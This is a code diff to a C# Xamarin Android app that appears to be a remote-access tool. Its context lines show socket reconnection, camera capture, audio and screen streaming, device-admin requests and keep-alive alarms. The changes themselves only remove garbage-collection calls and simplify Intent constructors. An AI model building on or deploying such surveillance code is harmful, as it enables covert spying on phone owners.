@@ -121,7 +121,7 @@ namespace Task2
                     if (Soketimiz != null) {
                         try { Soketimiz.Close(); } catch (Exception) { } try { Soketimiz.Dispose(); } catch (Exception) { }                     
                     }
-                    GC.Collect();
+                    
                     Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                     Soketimiz.ReceiveTimeout = -1; Soketimiz.SendTimeout = -1;
                     Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
@@ -246,7 +246,7 @@ namespace Task2
                         memos.Flush(); memos.Close(); memos.Dispose();
                     }
                     Dispose();
-                    GC.Collect();
+                    
                     if (tmp_form.CLOSE_CONNECTION == false)
                     {
 
@@ -389,7 +389,7 @@ namespace Task2
             try
             {
                 AlarmManager am = (AlarmManager)context.GetSystemService(AlarmService);
-                Intent i = new Intent(context, Java.Lang.Class.FromType(typeof(Alarm)));
+                Intent i = new Intent(context, typeof(Alarm));
                 PendingIntent pi = PendingIntent.GetBroadcast(context, 0, i, 0);
                 if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
                     am.SetExactAndAllowWhileIdle(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
@@ -403,14 +403,13 @@ namespace Task2
         {
             try
             {
-                Intent intent = new Intent(context, Java.Lang.Class.FromType(typeof(Alarm)));
+                Intent intent = new Intent(context, typeof(Alarm));
                 PendingIntent sender = PendingIntent.GetBroadcast(context, 0, intent, 0);
                 AlarmManager alarmManager = (AlarmManager)context.GetSystemService(AlarmService);
                 alarmManager.Cancel(sender); alarmManager.Dispose();
-                intent.Dispose();
             }
             catch (Exception) { }
-            GC.Collect();
+            
         }
         public void kameraCek(Socket soket)
         {
@@ -624,7 +623,7 @@ namespace Task2
                 client.Dispose();
                 client = null;
             }
-            GC.Collect();
+            
         }
         private void AudioStream_OnBroadcast(object sender, byte[] e)
         {
@@ -816,7 +815,7 @@ namespace Task2
         public const int RequestCodeEnableAdmin = 15;
         private void startProjection()
         {
-            Intent intent = new Intent(ApplicationContext, Java.Lang.Class.FromType(typeof(screenActivty)));
+            Intent intent = new Intent(ApplicationContext, typeof(screenActivty));
             StartActivity(intent);
         }
         public void stopProjection()
@@ -834,7 +833,7 @@ namespace Task2
                 try { ImageAvailableListener.screenSock.Close(); } catch { }
                 try { ImageAvailableListener.screenSock.Dispose(); } catch { }
             }
-            GC.Collect();
+            
         }
         protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
         {
@@ -1408,7 +1407,7 @@ namespace Task2
 
                     if (ms != null) { ms.Flush(); ms.Close(); ms.Dispose(); }
                     dosya = new byte[] { };
-                    GC.Collect();
+                    
                 }
                 catch (Exception)
                 {
